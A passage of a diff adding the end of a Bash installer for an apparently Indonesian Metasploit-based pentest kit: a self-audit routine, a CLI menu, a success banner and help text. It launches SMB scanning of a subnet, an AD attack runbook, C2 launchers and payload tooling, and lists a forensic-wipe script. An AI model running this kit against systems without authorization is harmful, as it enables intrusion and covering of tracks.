+                echo "  [✗] $f — SYNTAX ERROR"
+                ((syntax_fail++))
+            fi
+        done
+        echo "  Total: $syntax_ok passed, $syntax_fail failed"
+        echo ""
+
+        echo "── Shebang Check ──"
+        find "$INSTALL_DIR" -type f -name "*.sh" | while IFS= read -r f; do
+            local first_line; first_line=$(head -1 "$f")
+            if [[ "$first_line" == "#!/usr/bin/env bash" ]] || [[ "$first_line" == "#!/bin/bash" ]]; then
+                echo "  [✓] $f"
+            else
+                echo "  [!] $f — missing/incorrect shebang: $first_line"
+            fi
+        done
+        echo ""
+
+        echo "── set -euo pipefail Check ──"
+        find "$INSTALL_DIR" -type f -name "*.sh" | while IFS= read -r f; do
+            if grep -q "set -euo pipefail" "$f"; then
+                echo "  [✓] $f"
+            else
+                echo "  [!] $f — missing 'set -euo pipefail'"
+            fi
+        done
+        echo ""
+
+        echo "── External Dependency Check ──"
+        for tool in nmap msfconsole msfvenom python3 python pipx go git curl wget ruby bundle psql hashcat john ffuf nuclei subfinder httpx sqlmap hydra crackmapexec nikto enum4linux bloodhound amass gau waybackurls qsreplace dalfox whatweb userevac/web-analyze; do
+            if command -v "$tool" &>/dev/null; then
+                echo "  [✓] $tool"
+            else
+                echo "  [*] $tool — not in PATH (may be in ~/go/bin or pipx bin)"
+            fi
+        done
+        echo ""
+
+        echo "── Module Load Test ──"
+        if [[ -f "$INSTALL_DIR/msf-run.sh" ]]; then
+            bash "$INSTALL_DIR/msf-run.sh" modules 2>&1 | head -30
+        fi
+
+    } | tee "$audit_log"
+
+    log "Audit log saved: $audit_log"
+}
+
+# ──────────────────────────────────────────────────────────────────
+# print_final_banner() — Success banner with next steps
+# ──────────────────────────────────────────────────────────────────
+print_final_banner() {
+    local duration="${1:-}"
+    echo ""
+    echo -e "${GREEN}${BOLD}╔════════════════════════════════════════════════════════════════════════════╗${NC}"
+    echo -e "${GREEN}${BOLD}║                                                                              ║${NC}"
+    echo -e "${GREEN}${BOLD}║   ✅  INSTALASI SELESAI 100% — ZERO MANUAL STEPS REMAINING                  ║${NC}"
+    echo -e "${GREEN}${BOLD}║                                                                              ║${NC}"
+    echo -e "${GREEN}${BOLD}╠════════════════════════════════════════════════════════════════════════════╣${NC}"
+    echo -e "${GREEN}${BOLD}║                                                                              ║${NC}"
+    echo -e "${GREEN}${BOLD}║   📁 Lokasi Framework:  ${CYAN}$INSTALL_DIR${NC}${GREEN}${BOLD}                                ║${NC}"
+    echo -e "${GREEN}${BOLD}║   🌐 Dashboard:         ${CYAN}http://localhost:${DASHBOARD_PORT:-8080}${NC}${GREEN}${BOLD}                                  ║${NC}"
+    echo -e "${GREEN}${BOLD}║   📊 Laporan Siap:      ${CYAN}$INSTALL_DIR/system_ready.md${NC}${GREEN}${BOLD}                        ║${NC}"
+    echo -e "${GREEN}${BOLD}║   ⏱  Durasi Install:    ${CYAN}${duration}${NC}${GREEN}${BOLD}                                                          ║${NC}"
+    echo -e "${GREEN}${BOLD}║                                                                              ║${NC}"
+    echo -e "${GREEN}${BOLD}╠════════════════════════════════════════════════════════════════════════════╣${NC}"
+    echo -e "${GREEN}${BOLD}║                                                                              ║${NC}"
+    echo -e "${GREEN}${BOLD}║   ${YELLOW}🚀  PERINTAH PERTAMA YANG BISA LANGSUNG DIJALANKAN:${NC}${GREEN}${BOLD}                       ║${NC}"
+    echo -e "${GREEN}${BOLD}║                                                                              ║${NC}"
+    echo -e "${GREEN}${BOLD}║   ${CYAN}cd $INSTALL_DIR${NC}${GREEN}${BOLD}                                                           ║${NC}"
+    echo -e "${GREEN}${BOLD}║   ${CYAN}./msf-run.sh --list-modules${NC}${GREEN}${BOLD}                                                   ║${NC}"
+    echo -e "${GREEN}${BOLD}║   ${CYAN}./msf-ai.sh \"Bagaimana cara memulai?\"${NC}${GREEN}${BOLD}                                        ║${NC}"
+    echo -e "${GREEN}${BOLD}║   ${CYAN}./msf-run.sh module scanner/smb/smb_scanner 192.168.1.0/24${NC}${GREEN}${BOLD}                 ║${NC}"
+    echo -e "${GREEN}${BOLD}║                                                                              ║${NC}"
+    echo -e "${GREEN}${BOLD}╠════════════════════════════════════════════════════════════════════════════╣${NC}"
+    echo -e "${GREEN}${BOLD}║                                                                              ║${NC}"
+    echo -e "${GREEN}${BOLD}║   ${MAGENTA}⚡  SEMUA SUDAH SIAP. TANPA EDIT CONFIG. TANPA INSTAL ULANG.${NC}${GREEN}${BOLD}              ║${NC}"
+    echo -e "${GREEN}${BOLD}║                                                                              ║${NC}"
+    echo -e "${GREEN}${BOLD}╚════════════════════════════════════════════════════════════════════════════╝${NC}"
+    echo ""
+}
+
+# ──────────────────────────────────────────────────────────────────
+# main() — CLI entry point with flag dispatch
+# ──────────────────────────────────────────────────────────────────
+main() {
+    # Load config early for defaults
+    load_config
+
+    # Handle flags
+    case "${1:-}" in
+        --help|-h)
+            show_help
+            exit 0
+            ;;
+        --version|-v)
+            echo "metasploit-installer v1.0.0"
+            exit 0
+            ;;
+        --full)
+            FORCE_MODE=true
+            do_full_install
+            exit $?
+            ;;
+        --install)
+            FORCE_MODE=true
+            load_config
+            detect_environment
+            create_directory_structure
+            populate_all_files
+            do_install_metasploit
+            install_dashboard
+            setup_path
+            print_final_banner
+            exit $?
+            ;;
+        --deps)
+            load_config
+            detect_environment
+            do_install_deps
+            install_go_tools
+            install_python_tools
+            exit $?
+            ;;
+        --check)
+            load_config
+            detect_environment
+            do_preflight_check
+            exit $?
+            ;;
+        --health-check)
+            do_health_check
+            exit $?
+            ;;
+        --smoke-test)
+            run_smoke_test
+            exit $?
+            ;;
+        --resume)
+            resume_skip "populate_all_files" || true
+            resume_skip "do_install_deps" || true
+            resume_skip "install_go_tools" || true
+            resume_skip "install_python_tools" || true
+            resume_skip "do_install_metasploit" || true
+            do_full_install
+            exit $?
+            ;;
+        --uninstall)
+            load_config
+            do_uninstall
+            exit $?
+            ;;
+        --clear-cache)
+            clear_cache
+            exit 0
+            ;;
+        --dry-run)
+            DRY_RUN=true
+            info "DRY RUN MODE — no changes will be made"
+            load_config
+            detect_environment
+            do_preflight_check
+            exit $?
+            ;;
+        --force)
+            FORCE_MODE=true
+            do_full_install
+            exit $?
+            ;;
+        --module)
+            shift
+            load_config
+            detect_environment
+            if [[ -n "${1:-}" ]]; then
+                bash "$INSTALL_DIR/modules/$1" "${@:2}"
+            else
+                err "Usage: $0 --module <module_path> [args...]"
+                exit 1
+            fi
+            exit $?
+            ;;
+        --tmux)
+            shift
+            bash "$SCRIPT_DIR/scripts/tmux-session.sh" "${@:-pentest}"
+            exit $?
+            ;;
+        --report)
+            generate_report
+            exit $?
+            ;;
+        --audit)
+            audit_self
+            exit $?
+            ;;
+        --tui|menu|"")
+            show_tui_main_menu
+            local choice
+            read -r -p "  [?] Pilih (0-14): " choice
+            case "$choice" in
+                1|full) do_full_install ;;
+                2|check) do_preflight_check ;;
+                3|deps) do_install_deps; install_go_tools; install_python_tools ;;
+                4|metasploit) do_install_metasploit; install_dashboard; setup_path ;;
+                5|dashboard) install_dashboard ;;
+                6|modules) do_browse_modules ;;
+                7|cheatsheet) bash "$INSTALL_DIR/cheatsheets/msf-commands.sh" ;;
+                8|runbooks) bash "$INSTALL_DIR/runbooks/ad-attack.sh" Corpus corp.local 10.0.0.10 192.168.1.100 2>/dev/null || bash "$INSTALL_DIR/msf-runbooks.sh" ;;
+                9|framework) bash "$INSTALL_DIR/msf-pentest-framework.sh" ;;
+                10|tmux) bash "$INSTALL_DIR/scripts/tmux-session.sh" ;;
+                11|health) do_health_check ;;
+                12|report) generate_report ;;
+                13|encrypt) encrypt_config ;;
+                14|uninstall) do_uninstall ;;
+                0|quit) info "Sampai jumpa!"; exit 0 ;;
+                *) warn "Pilihan tidak valid" ;;
+            esac
+            ;;
+        *)
+            # If first arg looks like a module path, run it
+            if [[ "${1:-}" == */* ]]; then
+                load_config
+                detect_environment
+                bash "$INSTALL_DIR/modules/$1" "${@:2}"
+                exit $?
+            fi
+            warn "Unknown command: $1"
+            show_help
+            exit 1
+            ;;
+    esac
+}
+
+# ──────────────────────────────────────────────────────────────────
+# show_help() — Usage information
+# ──────────────────────────────────────────────────────────────────
+show_help() {
+    cat << 'HELP'
+metasploit-installer — Master Orchestrator Setup Script
+
+USAGE:
+    bash setup.sh [OPTIONS]
+
+    # Zero-config one-click install:
+    bash setup.sh --full                    # Full automated installation
+    bash setup.sh --install                 # Install Metasploit only (deps assumed)
+    bash setup.sh --tui                     # Interactive TUI menu (whiptail)
+
+    # Targeted operations:
+    bash setup.sh --deps                    # Install system + Go + Python deps only
+    bash setup.sh --check                   # Pre-flight environment check
+    bash setup.sh --health-check            # Post-install health check + auto-repair
+    bash setup.sh --smoke-test              # Run smoke test on all tools
+    bash setup.sh --audit                   # Self-audit all files & dependencies
+
+    # Module execution:
+    bash setup.sh --module <category/subcategory/module> [args]
+    bash setup.sh scanner/smb/smb_scanner 192.168.1.0/24
+
+    # Maintenance:
+    bash setup.sh --resume                  # Resume from last checkpoint
+    bash setup.sh --uninstall               # Complete removal
+    bash setup.sh --clear-cache             # Clear ~/.cache/metasploit-installer/
+    bash setup.sh --dry-run                 # Show what would be done
+    bash setup.sh --force                   # Force reinstall (skip idempotency)
+    bash setup.sh --tmux [session]          # Launch tmux pentest layout
+    bash setup.sh --report                  # Generate system report
+    bash setup.sh --help                    # Show this help
+
+CONFIGURATION:
+    Edit $INSTALL_DIR/config.env for custom settings:
+    INSTALL_DIR=/custom/path                # Default: ~/metasploit-installer
+    GITHUB_REPO_URL=https://github.com/...  # Enable auto-push
+    AUTO_PUSH=true                          # Auto-git push on install
+    SKIP_TOOLS=go,python                    # Skip tool categories
+    APT_MIRROR=http://mirror.example.com    # Override APT mirror
+    DEBUG_MODE=true                         # Verbose output
+    VT_API_KEY=xxx                          # VirusTotal API
+    SHODAN_API_KEY=xxx                      # Shodan API
+    TELEGRAM_BOT_TOKEN=xxx                  # Telegram notifications
+    TELEGRAM_CHAT_ID=xxx
+
+EXAMPLES:
+    # Full auto-install (recommended):
+    bash setup.sh --full
+
+    # Interactive menu:
+    bash setup.sh --tui
+
+    # Run SMB scanner module:
+    bash setup.sh --module scanner/smb/smb_scanner 192.168.1.0/24
+
+    # Direct module call:
+    bash modules/scanner/smb/smb_scanner.sh 192.168.1.0/24
+
+FILE STRUCTURE AFTER INSTALL:
+    $INSTALL_DIR/
+    ├── setup.sh                 # This orchestrator
+    ├── msf-run.sh               # Module launcher & TUI
+    ├── msf-pentest-framework.sh # 5-phase PTES/NIST framework
+    ├── msf-runbooks.sh          # AD/Web/Wireless runbooks
+    ├── msf-cheatsheet.sh        # Command reference
+    ├── msf-ai.sh                # LLM assistant (Ollama/OpenAI)
+    ├── c2-run.sh                # Multi-C2 launcher (Sliver/Havoc/Mythic)
+    ├── config.env               # Configuration (chmod 600)
+    ├── lib/                     # Core libraries
+    │   ├── common.sh            # Logging, helpers
+    │   ├── env.sh               # OS/user/path detection
+    │   ├── checker.sh           # Pre-flight checks
+    │   ├── deps.sh              # Dependency installer
+    │   ├── root-bridge.sh       # Root/non-root handling
+    │   ├── fuzzer.sh            # HTTP fuzzing
+    │   ├── validator.sh         # Vuln validation
+    │   ├── llm_helper.sh        # AI integration
+    │   └── external_api.sh      # VT/Shodan/NVD/Censys
+    ├── modules/                 # 25+ modules (scanner/exploit/post/auxiliary)
+    ├── runbooks/                # AD attack, Web attack, Emergency breakglass
+    ├── cheatsheets/             # MSF commands, Payload generator
+    ├── scripts/                 # Daily scan, Report, Forensic wipe, Telegram
+    ├── dashboard/               # Flask + Socket.IO web dashboard
+    ├── lab/                     # Docker vuln lab (DVWA, Metasploitable)
+    ├── collab/                  # Team mode lock file
+    └── 06-logs/                 # Audit logs, smoke tests, snapshots
+
+HELP
+}
+
+# ──────────────────────────────────────────────────────────────────
+# SCRIPT EXECUTION GUARD
+# ──────────────────────────────────────────────────────────────────
+if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
+    main "$@"
+fi
+
